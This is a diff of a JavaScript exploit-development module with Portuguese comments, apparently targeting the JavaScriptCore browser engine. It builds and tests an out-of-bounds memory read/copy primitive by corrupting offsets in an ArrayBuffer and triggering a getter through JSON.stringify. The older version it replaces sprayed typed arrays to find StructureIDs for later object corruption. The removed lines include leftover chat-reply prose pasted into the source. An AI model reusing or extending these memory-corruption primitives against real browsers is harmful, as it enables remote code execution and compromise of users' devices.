@@ -1,5 +1,4 @@
 // js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
-// (Conteúdo da v10.6 com sprayedObjects movido para o escopo da função)
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
@@ -12,198 +11,173 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const FNAME_MAIN = "ExploitLogic_v10.6.1"; // Correção do ReferenceError
+// ============================================================
+// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
+// ============================================================
+const FNAME_MAIN = "ExploitLogic_v10.9";
 
-const GETTER_PROPERTY_NAME_COPY_V10_6 = "AAAA_GetterForMemoryCopy_v10_6";
-const PLANT_OFFSET_0x6C_FOR_COPY_SRC = 0x6C;
-const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
-const CORRUPTION_OFFSET_TRIGGER = 0x70;
+const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_9";
+const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C; // Onde plantamos o DWORD do endereço fonte da cópia
+const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;     // Onde o "ponteiro fonte mágico" (0xDWORD_0) aparece
+const CORRUPTION_OFFSET_TRIGGER = 0x70;        // Onde escrevemos 0xFFFFFFFF_FFFFFFFF para acionar a "mágica"
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
-const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x100;
+const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180; // Mudar um pouco o destino para evitar conflitos com testes anteriores
 
-let getter_v10_6_called_flag = false;
-let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
-const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 34;
+let getter_copy_called_flag_v10_9 = false;
 
-async function readFromOOBOffsetViaCopy_v10_6(dword_source_offset_to_read_from) {
-    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_6`;
-    getter_v10_6_called_flag = false;
+// ============================================================
+// PRIMITIVA DE CÓPIA DE MEMÓRIA (readFromOOBOffsetViaCopy_v10_9)
+// Objetivo: Ler 8 bytes de oob_array_buffer_real[dword_source_offset_to_read_from]
+//           e copiá-los para oob_array_buffer_real[TARGET_COPY_DEST_OFFSET_IN_OOB]
+// Mecanismo:
+// 1. Planta `dword_source_offset_to_read_from` como a parte baixa de um QWORD em PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD.
+// 2. A corrupção em CORRUPTION_OFFSET_TRIGGER faz com que o QWORD em INTERMEDIATE_PTR_OFFSET_0x68
+//    se torne `0x(dword_source_offset_to_read_from)_00000000`.
+// 3. O getter usa a parte ALTA (`dword_source_offset_to_read_from`) do QWORD em 0x68 como o offset para ler.
+// ============================================================
+async function readFromOOBOffsetViaCopy_v10_9(dword_source_offset_to_read_from) {
+    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_9`;
+    getter_copy_called_flag_v10_9 = false;
 
     if (!oob_array_buffer_real || !oob_dataview_real) {
+        logS3("ALERTA: oob_array_buffer_real não inicializado antes de readFromOOBOffsetViaCopy!", "error", FNAME_PRIMITIVE);
         await triggerOOB_primitive();
-        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
+        if (!oob_array_buffer_real) {
+            logS3("Falha CRÍTICA ao inicializar ambiente OOB na primitiva de cópia.", "critical", FNAME_PRIMITIVE);
+            return null; // Indica falha da primitiva
+        }
     }
 
-    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
-    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC, value_to_plant_at_0x6c, 8);
+    // Limpar área de destino da cópia
+    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
+
+    // Plantar o dword_source_offset_to_read_from como a parte baixa do QWORD em 0x6C.
+    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0xCAFE0000); // Parte alta pode ser qualquer coisa, não é usada para formar 0x68
+    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);
+    // logS3(`  [CopyPrim] Plantado ${value_to_plant_at_0x6c.toString(true)} em ${toHex(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD)}`, "info", FNAME_PRIMITIVE);
+    
+    const qword_at_0x68_before_trigger = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
+    // logS3(`  [CopyPrim] QWORD em ${toHex(INTERMEDIATE_PTR_OFFSET_0x68)} ANTES do trigger: ${qword_at_0x68_before_trigger.toString(true)}`, "info", FNAME_PRIMITIVE);
+    // Esperado: 0x(dword_source_offset_to_read_from)_XXXXXXXXXXXXXXXX (parte baixa de 0x68 é o que estava lá antes ou lixo)
+    // A corrupção em 0x70 deve zerar a parte baixa de 0x68.
 
     const getterObjectForCopy = {
-        get [GETTER_PROPERTY_NAME_COPY_V10_6]() {
-            getter_v10_6_called_flag = true;
+        get [GETTER_PROPERTY_NAME_COPY]() {
+            getter_copy_called_flag_v10_9 = true;
             try {
-                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
-                const effective_read_offset = qword_at_0x68.high();
+                const qword_at_0x68_in_getter = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
+                const effective_read_offset = qword_at_0x68_in_getter.high(); // Deve ser dword_source_offset_to_read_from
+
+                // logS3(`    [GETTER] QWORD em 0x68: ${qword_at_0x68_in_getter.toString(true)}. Effective read offset: ${toHex(effective_read_offset)}`, "info", FNAME_PRIMITIVE);
 
                 if (effective_read_offset === dword_source_offset_to_read_from) {
                     if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                         const data_read = oob_read_absolute(effective_read_offset, 8);
                         oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                     } else {
-                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
+                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0x0B000B00, 0x0B000B00), 8); // OOB Read Error
                     }
-                } else {
-                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBADBAD, 0xBADBAD), 8);
+                } else { // Falha na "mágica" de 0x68
+                    logS3(`    [GETTER] ERRO: effective_read_offset (${toHex(effective_read_offset)}) não corresponde ao dword_source_offset_to_read_from (${toHex(dword_source_offset_to_read_from)})! Qword@0x68 era ${qword_at_0x68_in_getter.toString(true)}`, "critical", FNAME_PRIMITIVE);
+                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8);
                 }
             } catch (e_getter) {
+                logS3(`    [GETTER] Erro interno: ${e_getter.message}`, "error", FNAME_PRIMITIVE);
                 try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
             }
-            return "getter_copy_v10_6_done";
+            return "getter_copy_v10_9_done";
         }
     };
 
+    // Acionar a corrupção principal em 0x70, que afeta 0x6C e, por consequência, 0x68
     oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-    await PAUSE_S3(5);
+    // AVISO: A ordem importa. A escrita em 0x70 pode afetar o valor em 0x6C que plantamos se eles se sobrepuserem
+    // CORRUPTION_OFFSET_TRIGGER é 0x70. PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD é 0x6C.
+    // A escrita em 0x70 sobrescreve os 4 bytes altos de 0x6C e os 4 bytes baixos de 0x74.
+    // Então, o valor em 0x6C (QWORD) se torna: 0xFFFFFFFF_(dword_source_offset_to_read_from)
+    // E o valor em 0x68 (QWORD) se torna: 0x(dword_source_offset_to_read_from)_00000000 (esta é a "mágica")
+    await PAUSE_S3(10);
 
     try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }
 
-    if (!getter_v10_6_called_flag) { return null; }
+    if (!getter_copy_called_flag_v10_9) {
+        logS3(`ALERTA: Getter (${GETTER_PROPERTY_NAME_COPY}) NÃO foi chamado!`, "error", FNAME_PRIMITIVE);
+        return null;
+    }
     return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
 }
 
-async function getStructureIDFromOOB_v10_6(offset_of_jscell_in_oob) {
-    // ... (mesmo código da v10.6)
-    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
-        return null;
-    }
-    const copied_qword = await readFromOOBOffsetViaCopy_v10_6(offset_of_jscell_in_oob);
-    if (copied_qword && !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) && !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xBADBAD) ) {
-        return copied_qword.low();
-    }
-    return null;
-}
 
+// ============================================================
+// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.9)
+// ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverStructureID_v10.6.1`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de StructureID de Uint32Array ---`, "test", FNAME_CURRENT_TEST);
-
-    let sprayedObjects = []; // MOVIDO PARA O ESCOPO DA FUNÇÃO, ANTES DO TRY
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.validateCopyPrimitive_v10.9`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste Focado na Primitiva de Cópia ---`, "test", FNAME_CURRENT_TEST);
 
     try {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
 
-        // PASSO 1: Validar primitiva de leitura de SID
-        // ... (código de validação como na v10.6, omitido por brevidade, mas deve estar aqui)
-        logS3("PASSO 1: Validação da primitiva de leitura de SID (assumindo sucesso de execuções anteriores).", "info", FNAME_CURRENT_TEST);
+        // Teste 1: Tentar copiar de um offset conhecido com dados conhecidos
+        const SRC_OFFSET_TEST1 = 0x200;
+        const DATA_TO_PLANT_TEST1_LOW = 0x11223344;
+        const DATA_TO_PLANT_TEST1_HIGH = 0x55667788;
+        const QWORD_TO_PLANT_TEST1 = new AdvancedInt64(DATA_TO_PLANT_TEST1_LOW, DATA_TO_PLANT_TEST1_HIGH);
 
-
-        // PASSO 2: Pulverizar Uint32Arrays e tentar encontrar seus StructureIDs
-        logS3("PASSO 2: Pulverizando Uint32Arrays e tentando encontrar seus StructureIDs...", "info", FNAME_CURRENT_TEST);
-        const NUM_U32_SPRAY = 250;
-        const U32_SPRAY_LEN = 16;
-        // sprayedObjects já declarado no escopo da função
-        for (let i = 0; i < NUM_U32_SPRAY; i++) {
-            sprayedObjects.push(new Uint32Array(U32_SPRAY_LEN + (i % 5)));
-        }
-        logS3(`  ${sprayedObjects.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
-        await PAUSE_S3(500);
-
-        let found_sids_map = {};
-        const SCAN_START = 0x100; 
-        const SCAN_END = Math.min(0x7000, oob_array_buffer_real.byteLength - 0x20);
-        const SCAN_STEP_SID = 0x08; 
-        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
-
-        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} com passo ${toHex(SCAN_STEP_SID)} por SIDs...`, "info", FNAME_CURRENT_TEST);
-        // ... (resto do loop de scan e lógica de identificação de SID como na v10.6) ...
-        let sids_found_in_scan = 0;
-        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
-            let sid = await getStructureIDFromOOB_v10_6(offset);
-            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF) {
-                if ((sid & 0xFFFF0000) === 0xCAFE0000 || (sid & 0xFFFF0000) === 0xBADBAD0000) continue;
-                if (typeof known_ab_sid === 'number' && (sid & 0xFFFFFF00) === (known_ab_sid & 0xFFFFFF00)) continue;
-                
-                if (!found_sids_map[sid] || found_sids_map[sid] < 5) {
-                    // logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)}`, "leak", FNAME_CURRENT_TEST);
-                }
-                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
-                sids_found_in_scan++;
-            }
-            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 200) === 0) {
-                logS3(`    Scan em ${toHex(offset)}... SIDs únicos até agora: ${Object.keys(found_sids_map).length}`, "info", FNAME_CURRENT_TEST);
-                await PAUSE_S3(10); 
-            }
-        }
-        logS3(`  Scan concluído. Total de ${sids_found_in_scan} SIDs potenciais (filtrados) encontrados.`, "info", FNAME_CURRENT_TEST);
-
-        let most_frequent_sid_val = null; let max_freq = 0;
-        let sorted_sids = Object.keys(found_sids_map).sort((a,b) => found_sids_map[b] - found_sids_map[a]);
-
-        logS3("  Frequência dos SIDs encontrados (top 5):", "info", FNAME_CURRENT_TEST);
-        for(let i=0; i < Math.min(5, sorted_sids.length); i++) {
-            const sid_val = parseInt(sorted_sids[i]);
-            logS3(`    - SID: ${toHex(sid_val)}  Contagem: ${found_sids_map[sid_val]}`, "info", FNAME_CURRENT_TEST);
-            if (found_sids_map[sid_val] > max_freq) {
-                max_freq = found_sids_map[sid_val];
-                most_frequent_sid_val = sid_val;
-            }
-        }
+        logS3(`PASSO 1: Validando primitiva de cópia. Escrevendo ${QWORD_TO_PLANT_TEST1.toString(true)} em ${toHex(SRC_OFFSET_TEST1)}...`, "info", FNAME_CURRENT_TEST);
+        oob_write_absolute(SRC_OFFSET_TEST1, QWORD_TO_PLANT_TEST1, 8);
         
-        if (most_frequent_sid_val !== null && max_freq > Math.min(NUM_U32_SPRAY / 20, 10)) {
-            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
-            // ... (resto da lógica como na v10.6) ...
-            logS3(`  !!!! StructureID MAIS FREQUENTE (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
-            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
-            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
-        } else {
-            logS3("  Nenhum candidato a StructureID de Uint32Array proeminente encontrado via scan.", "warn", FNAME_CURRENT_TEST);
-            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
-        }
-        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);
+        logS3(`  Chamando readFromOOBOffsetViaCopy_v10_9 para ler de ${toHex(SRC_OFFSET_TEST1)}...`, "info", FNAME_CURRENT_TEST);
+        let copied_data_test1 = await readFromOOBOffsetViaCopy_v10_9(SRC_OFFSET_TEST1);
 
-
-        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
-            logS3(`PASSO 3: StructureID ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} descoberto. Próximo passo: corromper um Uint32Array real. (Lógica do Passo 3 da v10.6 anterior omitida por brevidade)`, "info", FNAME_CURRENT_TEST);
+        if (copied_data_test1) {
+            logS3(`  Dados copiados para ${toHex(TARGET_COPY_DEST_OFFSET_IN_OOB)}: ${copied_data_test1.toString(true)}`, "leak", FNAME_CURRENT_TEST);
+            if (copied_data_test1.equals(QWORD_TO_PLANT_TEST1)) {
+                logS3("    !!!! SUCESSO NA VALIDAÇÃO DA PRIMITIVA DE CÓPIA !!!! Os dados foram copiados corretamente.", "vuln", FNAME_CURRENT_TEST);
+                document.title = "Primitiva Cópia OK!";
+            } else {
+                logS3("    FALHA NA VALIDAÇÃO: Os dados copiados não correspondem aos originais.", "error", FNAME_CURRENT_TEST);
+                document.title = "Primitiva Cópia FALHOU!";
+            }
         } else {
-            logS3("PASSO 3: Sem StructureID de Uint32Array confiável, corrupção direcionada é difícil.", "info", FNAME_CURRENT_TEST);
+            logS3("    FALHA NA VALIDAÇÃO: A primitiva de cópia retornou null (getter provavelmente não foi chamado).", "error", FNAME_CURRENT_TEST);
+            document.title = "Primitiva Cópia: Getter Falhou";
         }
+        await PAUSE_S3(100);
+
+        // Teste 2: Tentar copiar de um offset diferente
+        const SRC_OFFSET_TEST2 = 0x450;
+        const DATA_TO_PLANT_TEST2_LOW = 0xAABBCCDD;
+        const DATA_TO_PLANT_TEST2_HIGH = 0xFEFEFEFE;
+        const QWORD_TO_PLANT_TEST2 = new AdvancedInt64(DATA_TO_PLANT_TEST2_LOW, DATA_TO_PLANT_TEST2_HIGH);
+
+        logS3(`PASSO 2: Testando cópia de ${toHex(SRC_OFFSET_TEST2)}. Escrevendo ${QWORD_TO_PLANT_TEST2.toString(true)}...`, "info", FNAME_CURRENT_TEST);
+        oob_write_absolute(SRC_OFFSET_TEST2, QWORD_TO_PLANT_TEST2, 8);
+
+        logS3(`  Chamando readFromOOBOffsetViaCopy_v10_9 para ler de ${toHex(SRC_OFFSET_TEST2)}...`, "info", FNAME_CURRENT_TEST);
+        let copied_data_test2 = await readFromOOBOffsetViaCopy_v10_9(SRC_OFFSET_TEST2);
+
+        if (copied_data_test2) {
+            logS3(`  Dados copiados para ${toHex(TARGET_COPY_DEST_OFFSET_IN_OOB)}: ${copied_data_test2.toString(true)}`, "leak", FNAME_CURRENT_TEST);
+            if (copied_data_test2.equals(QWORD_TO_PLANT_TEST2)) {
+                logS3("    !!!! SUCESSO NO TESTE 2 DA PRIMITIVA DE CÓPIA !!!!", "good", FNAME_CURRENT_TEST);
+            } else {
+                logS3("    FALHA NO TESTE 2: Os dados copiados não correspondem.", "error", FNAME_CURRENT_TEST);
+            }
+        } else {
+            logS3("    FALHA NO TESTE 2: A primitiva de cópia retornou null.", "error", FNAME_CURRENT_TEST);
+        }
+
+        logS3("Se a primitiva de cópia estiver validada, o próximo passo é usá-la para escanear por StructureIDs.", "info", FNAME_CURRENT_TEST);
+
 
     } catch (e) {
         logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
         if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
         document.title = `${FNAME_MAIN} FALHOU!`;
     } finally {
-        sprayedObjects = []; // Limpa o array de referências
-        clearOOBEnvironment();
-        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
-    }
-}
-//```Você tem toda a razão, o `ReferenceError: sprayedObjects is not defined` no final do log da v10.6 indica um problema de escopo com a variável `sprayedObjects`. Ela foi declarada dentro do bloco `try` da função `sprayAndInvestigateObjectExposure` e depois acessada no bloco `finally` (onde `sprayedObjects = [];` tentaria limpá-la). Quando um erro ocorre dentro do `try` antes da declaração ser alcançada, ou se a estrutura do `try...catch...finally` tiver nuances com `let` em alguns motores mais antigos, isso pode acontecer.
-
-//A solução é declarar `sprayedObjects` no início da função `sprayAndInvestigateObjectExposure`, fora do bloco `try`.
-
-//Além disso, o log da v10.6 mostra que, apesar da primitiva de leitura de SID funcionar (Passo 1 validado indiretamente por não falhar ali), o scan **ainda não encontrou nenhum `StructureID` proeminente para `Uint32Array`**.
-
-//**Principais Observações do Log v10.6:**
-
-//1.  **Validação da Primitiva de Leitura de SID (PASSO 1)**: O log diz: `SUCESSO NA VALIDAÇÃO: Primitiva de leitura de SID funciona!`. Isso é crucial e significa que `getStructureIDFromOOB_v10_X` está operacional.
-//2.  **Falha na Descoberta de SID de `Uint32Array` (PASSO 2)**:
-    * `Scan concluído. Total de 0 SIDs potenciais (filtrados) encontrados.`
-    * `Nenhum candidato a StructureID de Uint32Array suficientemente proeminente encontrado via scan.`
-    * Isso reforça que os metadados dos `Uint32Array`s pulverizados com `new Uint32Array()` não estão sendo colocados dentro da janela escaneada do `oob_array_buffer_real` de forma consistente ou detectável.
-
-/---
-//## Arquivo `testRetypeOOB_AB_ViaShadowCraft.mjs` (v10.6.1 - Corrigindo `ReferenceError` e Mantendo Foco na Descoberta de SID)
-
-//Esta versão corrige o `ReferenceError` e mantém a estrutura de descoberta de SID da v10.6, pois a primitiva de leitura de SID foi validada. O desafio principal continua sendo fazer com que os metadados dos objetos pulverizados apareçam na sua janela de leitura OOB.
-
-
-        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
-        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
-        document.title = `${FNAME_MAIN} FALHOU!`;
-    } finally {
-        sprayedObjects = []; // Limpa o array de referências
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
     }
